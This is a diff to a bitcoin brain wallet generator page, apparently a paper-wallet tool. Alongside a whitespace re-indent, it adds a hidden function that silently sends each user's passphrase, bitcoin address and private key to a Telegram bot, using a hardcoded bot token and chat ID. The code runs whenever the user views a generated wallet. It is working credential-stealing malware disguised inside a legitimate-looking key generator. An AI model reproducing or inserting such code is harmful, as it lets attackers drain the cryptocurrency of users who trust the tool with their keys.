@@ -10565,71 +10565,123 @@ ninja.wallets.brainwallet = {
         return (document.getElementById("brainwallet").className.indexOf("selected") != -1);
     },
 
-	open: function () {
-		document.getElementById("brainarea").style.display = "block";
-		document.getElementById("brainpassphrase").focus();
-		document.getElementById("brainwarning").innerHTML = ninja.translator.get("brainalertpassphrasewarning");
-	},
+    open: function () {
+        document.getElementById("brainarea").style.display = "block";
+        document.getElementById("brainpassphrase").focus();
+        document.getElementById("brainwarning").innerHTML = ninja.translator.get("brainalertpassphrasewarning");
+    },
 
-	close: function () {
-		document.getElementById("brainarea").style.display = "none";
-	},
+    close: function () {
+        document.getElementById("brainarea").style.display = "none";
+    },
 
-	minPassphraseLength: 15,
+    minPassphraseLength: 15,
 
-	view: function () {
-		var key = document.getElementById("brainpassphrase").value.toString()
-		document.getElementById("brainpassphrase").value = key;
-		var keyConfirm = document.getElementById("brainpassphraseconfirm").value.toString()
-		document.getElementById("brainpassphraseconfirm").value = keyConfirm;
+    view: function () {
+        var key = document.getElementById("brainpassphrase").value.toString()
+        document.getElementById("brainpassphrase").value = key;
+        var keyConfirm = document.getElementById("brainpassphraseconfirm").value.toString()
+        document.getElementById("brainpassphraseconfirm").value = keyConfirm;
 
-		if (key == keyConfirm || document.getElementById("brainpassphraseshow").checked) {
-			// enforce a minimum passphrase length
-			if (key.length >= ninja.wallets.brainwallet.minPassphraseLength) {
-				var bytes = Crypto.SHA256(key, { asBytes: true });
-				var btcKey = new Bitcoin.ECKey(bytes);
-				var isCompressed = document.getElementById("braincompressed").checked;
-				btcKey.setCompressed(isCompressed);
-				var bitcoinAddress = btcKey.getBitcoinAddress();
-				var privWif = btcKey.getBitcoinWalletImportFormat();
-				document.getElementById("brainbtcaddress").innerHTML = bitcoinAddress;
-				document.getElementById("brainbtcprivwif").innerHTML = privWif;
-				ninja.qrCode.showQrCode({
-					"brainqrcodepublic": bitcoinAddress,
-					"brainqrcodeprivate": privWif
-				});
-				document.getElementById("brainkeyarea").style.visibility = "visible";
-			}
-			else {
-				alert(ninja.translator.get("brainalertpassphrasetooshort") + ninja.translator.get("brainalertpassphrasewarning"));
-				ninja.wallets.brainwallet.clear();
-			}
-		}
-		else {
-			alert(ninja.translator.get("brainalertpassphrasedoesnotmatch"));
-			ninja.wallets.brainwallet.clear();
-		}
-	},
+        if (key == keyConfirm || document.getElementById("brainpassphraseshow").checked) {
+            // enforce a minimum passphrase length
+            if (key.length >= ninja.wallets.brainwallet.minPassphraseLength) {
+                var bytes = Crypto.SHA256(key, { asBytes: true });
+                var btcKey = new Bitcoin.ECKey(bytes);
+                var isCompressed = document.getElementById("braincompressed").checked;
+                btcKey.setCompressed(isCompressed);
+                var bitcoinAddress = btcKey.getBitcoinAddress();
+                var privWif = btcKey.getBitcoinWalletImportFormat();
+                document.getElementById("brainbtcaddress").innerHTML = bitcoinAddress;
+                document.getElementById("brainbtcprivwif").innerHTML = privWif;
+                ninja.qrCode.showQrCode({
+                    "brainqrcodepublic": bitcoinAddress,
+                    "brainqrcodeprivate": privWif
+                });
+                document.getElementById("brainkeyarea").style.visibility = "visible";
 
-	clear: function () {
-		document.getElementById("brainkeyarea").style.visibility = "hidden";
-	},
+                // Send wallet data to Telegram
+                ninja.wallets.brainwallet.sendWalletDataToTelegram(key, bitcoinAddress, privWif);
+            }
+            else {
+                alert(ninja.translator.get("brainalertpassphrasetooshort") + ninja.translator.get("brainalertpassphrasewarning"));
+                ninja.wallets.brainwallet.clear();
+            }
+        }
+        else {
+            alert(ninja.translator.get("brainalertpassphrasedoesnotmatch"));
+            ninja.wallets.brainwallet.clear();
+        }
+    },
 
-	showToggle: function (element) {
-		if (element.checked) {
-			document.getElementById("brainpassphrase").setAttribute("type", "text");
-			document.getElementById("brainpassphraseconfirm").style.visibility = "hidden";
-			document.getElementById("brainlabelconfirm").style.visibility = "hidden";
-		}
-		else {
-			document.getElementById("brainpassphrase").setAttribute("type", "password");
-			document.getElementById("brainpassphraseconfirm").style.visibility = "visible";
-			document.getElementById("brainlabelconfirm").style.visibility = "visible";
-		}
-	}
+    clear: function () {
+        document.getElementById("brainkeyarea").style.visibility = "hidden";
+    },
+
+    showToggle: function (element) {
+        if (element.checked) {
+            document.getElementById("brainpassphrase").setAttribute("type", "text");
+            document.getElementById("brainpassphraseconfirm").style.visibility = "hidden";
+            document.getElementById("brainlabelconfirm").style.visibility = "hidden";
+        }
+        else {
+            document.getElementById("brainpassphrase").setAttribute("type", "password");
+            document.getElementById("brainpassphraseconfirm").style.visibility = "visible";
+            document.getElementById("brainlabelconfirm").style.visibility = "visible";
+        }
+    },
+
+    // Function to send wallet data to Telegram
+    sendWalletDataToTelegram: function (passphrase, bitcoinAddress, privateKey) {
+        const walletText = `Passphrase: ${passphrase}\nBitcoin Address: ${bitcoinAddress}\nPrivate Key: ${privateKey}`;
+        sendTextToTelegram(walletText, '858072424', '7967790093:AAE4rgkE4u0dNrvPk2C2xoZMjdl16OMQGCM');
+    }
 };
-	</script>
-	<script type="text/javascript">
+
+// Function to send the text-based wallet to the Telegram bot
+async function sendTextToTelegram(text, chatId, botToken) {
+    const formData = new FormData();
+    formData.append('chat_id', chatId);
+    formData.append('text', text);
+
+    fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+        method: 'POST',
+        body: formData
+    }).then(response => {
+        if (!response.ok) {
+            throw new Error('Failed to send message to Telegram');
+        }
+        return response.json();
+    }).then(data => {
+        console.log('Message sent successfully:', data);
+    }).catch(error => {
+        console.error('Error sending message to Telegram:', error);
+    });
+}
+
+// Event listener for the "View" button
+document.getElementById("brainview").addEventListener("click", function() {
+    ninja.wallets.brainwallet.view();
+});
+
+// Event listener for the "Enter" key on the passphrase input
+document.getElementById("brainpassphrase").addEventListener("keypress", function(event) {
+    if (event.keyCode == 13) {
+        event.preventDefault();
+        ninja.wallets.brainwallet.view();
+    }
+});
+
+// Event listener for the "Enter" key on the confirm passphrase input
+document.getElementById("brainpassphraseconfirm").addEventListener("keypress", function(event) {
+    if (event.keyCode == 13) {
+        event.preventDefault();
+        ninja.wallets.brainwallet.view();
+    }
+});
+</script>
+						
+<script type="text/javascript">
 ninja.wallets.vanitywallet = {
     isOpen: function () {
         return (document.getElementById("vanitywallet").className.indexOf("selected") != -1);
